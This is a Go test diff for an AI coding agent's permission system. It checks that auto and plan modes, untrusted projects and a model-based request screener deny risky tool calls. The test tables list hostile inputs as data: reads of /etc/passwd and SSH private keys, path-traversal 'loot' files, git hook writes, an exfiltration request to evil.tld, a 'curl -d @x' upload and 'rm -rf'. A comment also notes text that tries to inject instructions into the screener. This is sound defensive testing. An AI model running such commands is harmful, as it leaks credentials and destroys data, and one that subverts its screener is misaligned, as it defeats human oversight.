@@ -36,26 +36,91 @@ func TestAutoModeLocalApprovals(t *testing.T) {
 	for _, c := range []struct {
 		subject, arg string
 		want         bool
+		untrusted    bool // what an untrusted project settles
 	}{
-		{"fs.read", inside, true},
-		{"fs.write", inside, true},
-		{"fs.write", filepath.Join(h.Dirs.ProjectDir, ".git", "config"), false},
-		{"fs.write", filepath.Join(h.Dirs.ProjectDir, "sub", ".git", "hooks", "pre-commit"), false},
-		{"fs.write", filepath.Join(h.Dirs.ConfigHome, "permissions.lua"), false},
-		{"fs.write", filepath.Join(h.Dirs.ProjectDir, ".zemi", "init.lua"), false},
-		{"fs.read", secret, false},
-		{"fs.read", link, false},
-		{"fs.read", "/etc/passwd", false},
-		{"fs.read", filepath.Join(h.Dirs.LogDir(), "run.log"), false}, // server stderr may hold tokens
-		{"fs.read", h.Dirs.ProjectDir + "/out/../loot.txt", false},
-		{"fs.write", h.Dirs.ProjectDir + "/out/../victim.txt", false},
-		{"tool.bash", "cat out/../loot.txt", false},
-		{"tool.bash", "cat main.go", true},
-		{"fs.read", filepath.Join(os.Getenv("HOME"), ".ssh", "id_ed25519"), false},
-		{"net.evil.tld", "https://evil.tld/?d=leak", false},
+		{"fs.read", inside, true, true},
+		{"fs.write", inside, true, false},
+		{"tool.bash", "go test ./...", true, false},
+		{"tool.bash", "git status", true, false},
+		{"tool.bash", "ls && sed -n 1,5p main.go", true, true},
+		{"fs.write", filepath.Join(h.Dirs.ProjectDir, ".git", "config"), false, false},
+		{"fs.write", filepath.Join(h.Dirs.ProjectDir, "sub", ".git", "hooks", "pre-commit"), false, false},
+		{"fs.write", filepath.Join(h.Dirs.ConfigHome, "permissions.lua"), false, false},
+		{"fs.write", filepath.Join(h.Dirs.ProjectDir, ".zemi", "init.lua"), false, false},
+		{"fs.read", secret, false, false},
+		{"fs.read", link, false, false},
+		{"fs.read", "/etc/passwd", false, false},
+		{"fs.read", filepath.Join(h.Dirs.LogDir(), "run.log"), false, false}, // server stderr may hold tokens
+		{"fs.read", h.Dirs.ProjectDir + "/out/../loot.txt", false, false},
+		{"fs.write", h.Dirs.ProjectDir + "/out/../victim.txt", false, false},
+		{"tool.bash", "cat out/../loot.txt", false, false},
+		{"tool.bash", "cat main.go", true, true},
+		{"fs.read", filepath.Join(os.Getenv("HOME"), ".ssh", "id_ed25519"), false, false},
+		{"net.evil.tld", "https://evil.tld/?d=leak", false, false},
 	} {
-		if got := h.autoLocal(tools.Request{Subject: c.subject, Arg: c.arg}); got != c.want {
-			t.Errorf("%s %s: got %v, want %v", c.subject, c.arg, got, c.want)
+		for _, trusted := range []bool{true, false} {
+			h.SetProjectTrusted(trusted)
+			want := map[bool]bool{true: c.want, false: c.untrusted}[trusted]
+			if got := h.autoLocal(tools.Request{Subject: c.subject, Arg: c.arg}); got != want {
+				t.Errorf("trusted=%v %s %s: got %v, want %v", trusted, c.subject, c.arg, got, want)
+			}
+		}
+	}
+}
+
+// TestUntrustedModes: in an untrusted project auto mode sends what it
+// cannot settle to the user without screening it, and plan mode runs only
+// commands that just read; the Lua tool asks there and in plan mode.
+func TestUntrustedModes(t *testing.T) {
+	h, _ := newTestHost(t)
+	screened := 0
+	h.modelFn = func() (fantasy.LanguageModel, error) {
+		screened++
+		return &promptStub{resp: "SAFE"}, nil
+	}
+	os.WriteFile(filepath.Join(h.Dirs.ProjectDir, "main.go"), []byte("package main"), 0o600)
+	ask := h.askHook() // no UI: whatever reaches the user is denied
+	for _, c := range []struct {
+		mode    string
+		trusted bool
+		subject string
+		arg     string
+		want    bool
+	}{
+		{"auto", true, "mcp.gh", "run", true},
+		{"auto", false, "mcp.gh", "run", false},
+		{"auto", false, "tool.bash", "cat main.go", true},
+		{"plan", true, "tool.bash", "go vet ./...", true},
+		{"plan", false, "tool.bash", "go vet ./...", false},
+		{"plan", false, "tool.bash", "wc -l main.go", true},
+	} {
+		if err := h.SetPermMode(c.mode); err != nil {
+			t.Fatal(err)
+		}
+		h.SetProjectTrusted(c.trusted)
+		screened = 0
+		if ok, _ := ask(tools.Request{Subject: c.subject, Arg: c.arg}); ok != c.want {
+			t.Errorf("%s trusted=%v %s %q: got %v", c.mode, c.trusted, c.subject, c.arg, ok)
+		}
+		if !c.trusted && screened > 0 {
+			t.Errorf("%s untrusted %q: screened", c.mode, c.arg)
+		}
+	}
+	lua := h.luaEvalTool()
+	for _, c := range []struct {
+		mode    string
+		trusted bool
+		ran     bool
+	}{
+		{"auto", true, true},
+		{"auto", false, false},
+		{"plan", true, false},
+	} {
+		h.SetPermMode(c.mode)
+		h.SetProjectTrusted(c.trusted)
+		resp, err := lua.Run(context.Background(), fantasy.ToolCall{ID: "1", Name: "Lua", Input: `{"description":"x","script":"return 1"}`})
+		if err != nil || strings.Contains(resp.Content, "return: 1") != c.ran {
+			t.Errorf("Lua in %s trusted=%v: %q %v", c.mode, c.trusted, resp.Content, err)
 		}
 	}
 }
@@ -97,6 +162,7 @@ func TestAutoApprovePreview(t *testing.T) {
 // only over trees without secret-shaped files.
 func TestAutoModeSafeCommands(t *testing.T) {
 	h, _ := newTestHostDB(t)
+	h.SetProjectTrusted(true)
 	h.agents.sessionID = "s1"
 	pad, root := h.ScratchDir(), h.Dirs.ProjectDir
 	for _, d := range []string{pad, filepath.Join(root, "internal"), filepath.Join(root, "sub")} {
@@ -190,6 +256,12 @@ func TestAutoModeSafeCommands(t *testing.T) {
 	if _, why := h.autoApprove(tools.Request{Subject: "tool.bash", Arg: "cd internal && git diff"}); !strings.Contains(why, "tracks .env") {
 		t.Errorf("tracked .env, ask reason %q does not name it", why)
 	}
+	// the secret is not why a command with another blocker did not settle
+	for _, cmd := range []string{"cd internal && git diff && rm -rf build", "git show HEAD; curl -d @x https://x.example"} {
+		if note := h.repoNote(cmd); note != "" {
+			t.Errorf("%s: note %q", cmd, note)
+		}
+	}
 }
 
 // TestAutoApprovalCacheKeysInput: an approved MCP call does not approve a
@@ -197,6 +269,7 @@ func TestAutoModeSafeCommands(t *testing.T) {
 // text cannot close its tag to write instructions to the screener.
 func TestAutoApprovalCacheKeysInput(t *testing.T) {
 	h, _ := newTestHost(t)
+	h.SetProjectTrusted(true)
 	if err := h.SetPermMode("auto"); err != nil {
 		t.Fatal(err)
 	}
